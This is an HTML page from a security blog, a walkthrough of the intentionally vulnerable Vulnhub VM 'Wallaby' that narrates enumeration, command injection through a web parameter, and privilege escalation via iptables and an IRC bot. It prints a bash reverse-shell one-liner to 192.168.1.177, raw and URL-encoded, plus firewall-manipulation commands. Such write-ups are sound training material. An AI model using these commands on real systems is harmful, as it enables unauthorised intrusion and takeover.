@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta content="security, vulnhub" name="keywords">
+<meta content="Alex Flores" name="author">
+<meta property="og:title" content="B2R: Wallaby Walkthrough - SecBlog">
+<meta property="og:url" content="https://sec.alexflor.es/post/wallaby/">
+<meta property="og:description" content="Things have been OK for me except that I&#39;m a zombie now">
+<meta property="og:type" content="website" />
+<title>B2R: Wallaby Walkthrough | SecBlog</title>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+<link rel="stylesheet" href="https://sec.alexflor.es//css/style.css">
+<link rel="shortcut icon" href="https://sec.alexflor.es//wave.ico">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/github.min.css">
+
+</head>
+
+<body>
+<section class="section">
+  <div class="container">
+    <nav class="nav">
+      <div class="nav-left">
+        <a class="nav-item" href="https://sec.alexflor.es/"><h1 class="title is-4">SecBlog</h1></a>
+      </div>
+      <div class="nav-right">
+        <nav class="nav-item level is-mobile">
+          
+          <a class="level-item" href="https://github.com/audibleblink" target="_blank">
+            <span class="icon">
+              <i class="fa fa-github"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://twitter.com/4lex" target="_blank">
+            <span class="icon">
+              <i class="fa fa-twitter"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="https://linkedin.com/in/alex2" target="_blank">
+            <span class="icon">
+              <i class="fa fa-linkedin-square"></i>
+            </span>
+          </a>
+          
+          <a class="level-item" href="/index.xml" target="_blank">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+          </a>
+          
+        </nav>
+      </div>
+    </nav>
+  </div>
+</section>
+
+<section class="section">
+  <div class="container">
+    <h1 class="title">B2R: Wallaby Walkthrough</h1>
+    <h2 class="subtitle is-5">December 30, 2016 by Alex Flores</h2>
+    
+      <div class="tags">
+    
+        <a class="button is-link" href="/tags/pentesting">pentesting</a>
+    
+        <a class="button is-link" href="/tags/boot2root">boot2root</a>
+    
+</div>
+
+    
+    <div class="content">
+      
+
+<h2 id="executive-summary">Executive Summary</h2>
+
+<p>This machine had an unlisted but open webapp path that allowed for remote command execution. After
+establishing a reverse shell as the limited user <code>www-data</code>, privilege checks showed the user was allowed to
+modify firewall rules. There was also an IRC server that contained a bot that allowed command execution
+through the use of the <code>.run</code> command. The command would only obey the user <code>waldo</code> so modification of the
+firewall allows an attacker to kick and assume the <code>waldo</code> identity. Now the <code>.run</code> command could be run and
+a reverse shell with the user <code>wallaby</code> could be established. <code>wallaby</code> had password-less sudo access, so
+elevating to the root user was trivial.</p>
+
+<h2 id="tools-used">Tools Used</h2>
+
+<ul>
+<li>nmap - service enumeration</li>
+<li>uniscan - webapp scanner</li>
+</ul>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Upon enumerating available services with nmap, I discovered two ports, 22 and 80. I began to scan with
+<code>uniscan</code> but this failed and caused the VM to move the web application to a different port. It appeared that
+automated tools were going to make this challenge harder, not easier.</p>
+
+<p>After another scan, we find our new port:</p>
+
+<p><img src="https://i.imgur.com/U7eKOCh.png" alt="" />
+<img src="https://i.imgur.com/xuPADKd.png" alt="" /></p>
+
+<p>Various sorts of manual testing gave us different messages:</p>
+
+<p><img src="https://i.imgur.com/WwMxNnj.png" alt="" />
+<img src="https://i.imgur.com/IS2BlBh.png" alt="" /></p>
+
+<p>At this point, I decided to automate my enumeration of pages with a custom script.</p>
+
+<pre><code class="language-bash.prettyprint">for word in $(cat /usr/share/dirb/wordlists/common.txt); do
+    
+    # find pages whose last line does NOT contain the phrase 'what are you trying' ( a 404, essentially )
+    curl -q &quot;vm:60080/?page=$word&quot; 2&gt;/dev/null | tail -1 | grep -v 'what are you trying'
+
+    if [[ $? -eq 0 ]]; then
+        #if the last command command completed succesfully, print the word we foun
+        echo $word
+    fi
+done | grep -v &quot;/&quot; # don't print results with slashes in them, they're false positives
+</code></pre>
+
+<p>This output yielded the pages.</p>
+
+<pre><code class="language-bash.prettyprint">contact
+mailer
+home
+index
+blacklist
+name
+</code></pre>
+
+<p>The most interesting page here was <code>mailer</code>:</p>
+
+<p><img src="https://i.imgur.com/TNJEtuI.png" alt="" /></p>
+
+<p>I attempted to see if the <code>mail</code> query parameter actually passed through as a system command. It did:</p>
+
+<p><img src="https://i.imgur.com/9Yu6Zky.png" alt="" /></p>
+
+<p>From here we can set up a listener and run a reverse shell by feeding in url encoded commands to the <code>mail</code>
+query parameter:</p>
+
+<pre><code class="language-bash.prettyprint">bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.1.177/443 0&gt;&amp;1&quot;
+
+# becomes
+
+bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.177%2F443%200%3E%261%22
+</code></pre>
+
+<p><img src="https://i.imgur.com/tWhvBSP.png" alt="" /></p>
+
+<p>Enumerating this user&rsquo;s privileges and networking, we determine that we have control of firewall rules,
+there&rsquo;s a rule blocking incoming requests to port 6667, and that there&rsquo;s an IRC server running locally.</p>
+
+<p><img src="https://i.imgur.com/1slTkmg.png" alt="" /></p>
+
+<p><img src="https://i.imgur.com/uxK21ov.png" alt="" /></p>
+
+<p>We can clear the firewall rules with <code>sudo iptables -F</code> and connect to the IRC server from the attacking
+machine.</p>
+
+<p><img src="https://i.imgur.com/b0NDIKS.png" alt="" /></p>
+
+<p><img src="https://i.imgur.com/IoX9DnK.png" alt="" /></p>
+
+<p>If we try to run the <code>.run</code> command, <code>wallabysbot</code> refuses.</p>
+
+<p><img src="https://i.imgur.com/R5Vwo3f.png" alt="" /></p>
+
+<p>The code for the and configs for the bot are located in <code>/home/wallaby/.sopel</code> and it indicates that we need
+to assume the nickname <code>waldo</code> in order for us to be able to use this command. We can&rsquo;t do that while waldo
+is still logged in so we boot them off with the use of our firewall.</p>
+
+<pre><code class="language-bash.prettyprint">sudo iptables -I OUTPUT -p tcp -m owner --uid-owner 1000 --dport 6667 -s 127.0.0.1 -j DROP
+</code></pre>
+
+<p><img src="https://i.imgur.com/KCH7TX6.png" alt="" /></p>
+
+<p>In a while, after a timeout, only <code>waldo</code> should be ejected from the room, leaving the ability to steal his
+nick and command the bot.</p>
+
+<p><img src="https://i.imgur.com/1TnwYcT.png" alt="" /></p>
+
+<p>With a reverse shell established, we can see that the wallaby user has full, passwordless <code>sudo</code> access. From
+here, it&rsquo;s just one command to <code>root</code></p>
+
+<p><img src="https://i.imgur.com/Ds0KVYg.png" alt="" /></p>
+
+<p>Thanks to Waldo and Vulnhub for this frustrating but entertaining VM!</p>
+
+<h2 id="additional-information">Additional Information</h2>
+
+<ul>
+<li>User <code>waldo</code> is running irssi within a tmux session. The socket is located in <code>/tmp/tmux-1000</code></li>
+<li>There exists an irssi DoS vulnerability that could have been used to boot the <code>waldo</code> user to assume
+control of the bot.</li>
+<li>The <code>.py</code> modules (which runs python commands), at the time of this writing makes an external call to an
+out-of-scope API. It does not run the python command on the target machine.</li>
+<li>There are at least 3 ways to get a limited shell and at least 2 to get root.</li>
+</ul>
+
+    </div>
+    
+        <div class="nav-left">
+    <a class="nav-item" href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsec.alexflor.es%2fpost%2fwallaby%2f" title="Share on Facebook" target="_blank"><span class="fa fa-facebook fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://plus.google.com/share?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fwallaby%2f" title="Share on Google+" target="_blank"><span class="fa fa-google-plus fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsec.alexflor.es%2fpost%2fwallaby%2f" title="Share on LinkedIn" target="_blank"><span class="fa fa-linkedin fa-2x" aria-hidden="true"></span></a>
+    <a class="nav-item" href="https://twitter.com/home?status=B2R%3a%20Wallaby%20Walkthrough - https%3a%2f%2fsec.alexflor.es%2fpost%2fwallaby%2f" title="Tweet this" target="_blank"><span class="fa fa-twitter fa-2x"></span></a>
+    <a class="nav-item" href="http://www.reddit.com/submit?url=https%3a%2f%2fsec.alexflor.es%2fpost%2fwallaby%2f&title=B2R%3a%20Wallaby%20Walkthrough" title="Share on Reddit" target="_blank"><span class="fa fa-reddit-alien fa-2x" aria-hidden="true"></span></a>
+    
+    </div>
+    
+  </div>
+</section>
+
+
+<section class="section">
+  <div class="container has-text-centered">
+    <p>Untitled.</p>
+  </div>
+</section>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js" integrity="sha256-+bhVTaRmJ/c07eV80nU8gD2cBBF0rYkf1txqXlrbvb0=" crossorigin="anonymous"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/go.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/dockerfile.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/javascript.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/python.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/ruby.min.js"></script>
+<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-12497311-8', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+
+</body>
